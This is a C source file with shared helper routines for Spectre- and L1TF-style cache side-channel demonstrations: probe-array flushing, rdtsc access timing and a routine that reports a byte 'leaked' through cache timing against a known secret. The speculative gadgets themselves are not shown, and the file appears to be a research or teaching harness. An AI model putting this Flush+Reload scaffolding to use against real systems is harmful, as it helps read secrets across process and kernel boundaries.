#include <stdio.h>
#include <stdint.h>
#include <string.h> // For memset
#include <immintrin.h> // For _mm_clflush, _mm_mfence, _mm_lfence (Intel intrinsics)
#include <x86intrin.h> // For __rdtsc (Intel intrinsic)
#include <setjmp.h>    // For sigsetjmp/siglongjmp to handle faults
#include <signal.h>    // For signal handling
#include <unistd.h>    // For getpagesize()
#include <sys/mman.h>  // For mmap/munmap (used in L1TF example)

// Define cache line size (common for x86-64)
#define CACHE_LINE_SIZE 64
// For a 256-entry probe array (0-255 possible byte values)
#define NUM_CACHE_LINES 256
#define PROBE_ARRAY_SIZE (NUM_CACHE_LINES * CACHE_LINE_SIZE)

// Global probe array for cache side-channel attacks
uint8_t probe_array[PROBE_ARRAY_SIZE];

// Function to flush the probe_array from cache
void flush_probe_array() {
    for (int i = 0; i < NUM_CACHE_LINES; i++) {
        _mm_clflush(&probe_array[i * CACHE_LINE_SIZE]);
    }
    _mm_mfence(); // Ensure flushes are complete and ordered
}

// Read Time Stamp Counter for high-resolution timing
static __inline__ uint64_t rdtsc() {
    unsigned long lo, hi;
    // __asm__ __volatile__ ("rdtsc" : "=a" (lo), "=d" (hi)); // GCC/Clang inline assembly
    return __rdtsc(); // Using intrinsic for simplicity
}

// Function to measure cache access time for a specific address
// Returns time in CPU cycles
long long measure_access_time(volatile uint8_t *addr) {
    uint64_t start_time, end_time;
    start_time = rdtsc();
    volatile uint8_t dummy = *addr; // Access the memory
    _mm_mfence(); // Ensure access completes before reading TSC
    end_time = rdtsc();
    return end_time - start_time;
}

// Placeholder for a benign target function, used in some Spectre V2-like scenarios
__attribute__((noinline))
void benign_target() {
    // Does nothing, just a valid call target
}

// Initial setup for main functions
void common_init() {
    memset(probe_array, 0, PROBE_ARRAY_SIZE);
    // Ensure probe_array is in cache initially to avoid false misses during flush test
    // Not strictly necessary but can help for consistency
    for (int i = 0; i < PROBE_ARRAY_SIZE; i += CACHE_LINE_SIZE) {
        probe_array[i] = 1;
    }
    _mm_mfence();
    flush_probe_array(); // Clear it out for fresh start
    _mm_mfence();
}

// Common function for cache timing measurement phase
int perform_measurement(uint8_t expected_secret, const char* secret_name) {
    printf("Measuring cache timings...\n");
    int leaked_byte = -1;
    long long min_time = -1;
    int CACHE_HIT_THRESHOLD = 50; // Cycles, tune based on system (often 10-80 for L1 hit)

    for (int i = 0; i < NUM_CACHE_LINES; i++) {
        volatile uint8_t *addr = &probe_array[i * CACHE_LINE_SIZE];
        long long access_time = measure_access_time(addr);

        if (access_time < CACHE_HIT_THRESHOLD && (min_time == -1 || access_time < min_time)) {
            min_time = access_time;
            leaked_byte = i;
        }
    }

    if (leaked_byte != -1) {
        printf("Leaked %s (speculatively): %c (ASCII %d), Access Time: %lld cycles\n",
               secret_name, (char)leaked_byte, leaked_byte, min_time);
        if (leaked_byte == expected_secret) {
            printf("SUCCESS! Leaked the actual %s.\n", secret_name);
            return 1;
        } else {
            printf("LEAKED VALUE DOES NOT MATCH ACTUAL %s.\n", secret_name);
            return 0;
        }
    } else {
        printf("No %s leaked or could not detect leakage.\n", secret_name);
        return 0;
    }
}